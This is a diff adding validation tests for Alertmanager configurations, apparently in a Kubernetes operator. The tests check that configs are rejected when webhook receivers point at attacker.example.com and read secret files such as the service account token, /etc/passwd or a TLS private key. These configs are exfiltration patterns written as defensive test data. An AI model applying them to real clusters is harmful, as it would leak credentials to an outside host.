@@ -260,6 +260,121 @@ var amCfgValidationTests = []struct {
           - api_url: http://slack`,
 		shouldFail: false,
 	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          webhook_configs:
+          - url: http://attacker.example.com
+            http_config:
+              bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token`,
+		shouldFail:  true,
+		errContains: "bearer_token_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          webhook_configs:
+          - url: http://attacker.example.com
+            http_config:
+              basic_auth:
+                username: admin
+                password_file: /etc/passwd`,
+		shouldFail:  true,
+		errContains: "password_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          webhook_configs:
+          - url: http://attacker.example.com
+            http_config:
+              authorization:
+                type: Bearer
+                credentials_file: /var/run/secrets/token`,
+		shouldFail:  true,
+		errContains: "credentials_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          webhook_configs:
+          - url: http://attacker.example.com
+            http_config:
+              oauth2:
+                client_id: id
+                client_secret_file: /etc/secret
+                token_url: http://example.com`,
+		shouldFail:  true,
+		errContains: "client_secret_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          webhook_configs:
+          - url: https://attacker.example.com
+            http_config:
+              tls_config:
+                key_file: /etc/ssl/private/server.key`,
+		shouldFail:  true,
+		errContains: "ca_file, cert_file and key_file",
+	},
+	{
+		config: `
+        global:
+          slack_api_url_file: /etc/slack-url
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop`,
+		shouldFail:  true,
+		errContains: "slack_api_url_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          slack_configs:
+          - api_url_file: /etc/slack-url`,
+		shouldFail:  true,
+		errContains: "api_url_file",
+	},
+	{
+		config: `
+        route:
+          receiver: noop
+
+        receivers:
+        - name: noop
+          victorops_configs:
+          - api_key_file: /etc/victorops-key
+            routing_key: rk`,
+		shouldFail:  true,
+		errContains: "api_key_file",
+	},
 }
 
 func Test_ValidateAlertmanagerConfig(t *testing.T) {
